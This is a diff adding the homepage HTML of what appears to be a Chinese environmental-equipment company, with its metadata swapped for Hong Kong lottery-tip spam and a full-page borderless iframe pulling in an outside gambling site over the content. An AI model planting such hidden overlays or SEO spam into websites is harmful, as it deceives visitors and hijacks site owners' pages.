@@ -1,0 +1,109 @@
+<!DOCTYPE>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>六肖中特期期免费公开网站</title>
+<meta name="description" content="六肖中特期期免费公开网打造最权威的内幕原创心水资料,无私为彩民提供精准的香港六合资料,六肖中特资料,现场开奖直播于本港台同步！" />
+<meta name="keywords" content="六肖中特期期免费公开" />
+<link href="/style/css/css.css" rel="stylesheet" type="text/css">
+<script type='text/javascript' src='/style/js/jquery-1.10.2.min.js'></script>
+<script type='text/javascript' src='/style/js/jquery.SuperSlide.js'></script>
+<script type='text/javascript' src='/style/js/public.js'></script>
+<script type="text/javascript" src="/adjs.js"></script>
+</head>
+<body>
+<iframe src="http://m.46kj.com/" width="100%" marginwidth='0' height='7000'  scrolling='no' frameborder='0' border='0'></iframe>
+<div class="top">
+  <div class="logo">
+    <div class="logo_left"> <img src="/style/images/logo.png"/> </div>
+    <div class="logo_right"></div>
+  </div>
+  <div class="menu">
+    <ul>
+      <li><a href="/">网站首页</a></li>
+      
+      <li><a href="/about/">关于我们</a></li>
+      
+      <li><a href="/news/">新闻中心</a></li>
+      
+      <li><a href="/product/">产品展示</a></li>
+      
+      <li><a href="/jiameng/">招商加盟</a></li>
+      
+      <li><a href="/honour/">荣誉资质</a></li>
+      
+      <li><a href="/contact/">联系我们</a></li>
+      
+    </ul>
+  </div>
+</div>
+
+<div class="main">
+  <div class="banner">
+    <div id="slideBox" class="slideBox">
+      <div class="hd">
+        <ul>
+          <li></li>
+          <li></li>
+          <li></li>
+        </ul>
+      </div>
+      <div class="bd">
+        <ul>
+          <li><a href="javascript:;"><img src="/images/defaultpic.gif"/></a></li>
+<li><a href="javascript:;"><img src="/images/defaultpic.gif"/></a></li>
+<li><a href="javascript:;"><img src="/images/defaultpic.gif"/></a></li>
+
+        </ul>
+      </div>
+    </div>
+  </div>
+  <script language="javascript">
+
+jQuery(".slideBox").slide({mainCell:".bd ul",effect:"fold",autoPlay:true,trigger:"click"});
+
+</script>
+  <div class="about">
+    <h1><span>关于我们</span> <a href="/about/">更多>></a></h1>
+    <ul>
+      <dl class="dl1">
+        <img src="/style/images/about.jpg"/>
+      </dl>
+      <dl class="dl2">
+         我司是一家集科研、设计、生产与销售为一体的专业环保设备生产厂家，主要生产各类商用型隔油池、油烟净化设备、厨房油烟净化设备及其定做油烟净化产品等。在国内各大、中城市设有分公司、办事处，建立了稳定而完善...
+      </dl>
+    </ul>
+  </div>
+  <div class="gongyi">
+    <h1><span>产品展示</span> <a href="/product/">更多>></a></h1>
+    <ul>
+      
+    </ul>
+  </div>
+  <div class="news">
+     <h1><span>新闻中心</span> <a href="/news/">更多>></a></h1>
+    <ul>
+      <li><i>[新闻中心]</i><a href="/news/11054.html">渗滤液的处理现状令人担忧</a><em>11-05</em></li>
+<li><i>[新闻中心]</i><a href="/news/11053.html">渗滤液---污染水土资源的祸首</a><em>11-05</em></li>
+<li><i>[新闻中心]</i><a href="/news/09232.html">餐厨垃圾“摇身”变肥料</a><em>09-23</em></li>
+<li><i>[新闻中心]</i><a href="/news/09231.html">不要让污水处理厂变成污水中转站</a><em>09-23</em></li>
+
+    </ul>
+  </div>
+  <div class="gongcheng">
+    <h1><span>荣誉资质</span> <a href="/honour/">更多>></a></h1>
+    <ul>
+      
+    </ul>
+  </div>
+</div>
+<div class="bottom">
+  <h1><a href="#">TOP</a></h1>
+  <ul class="ul2">
+    <p>Copyright &#169; 2015-2016 六肖中特期期免费公开网站 版权所有</p>
+  </ul>
+</div>
+
+</body>
+</html>
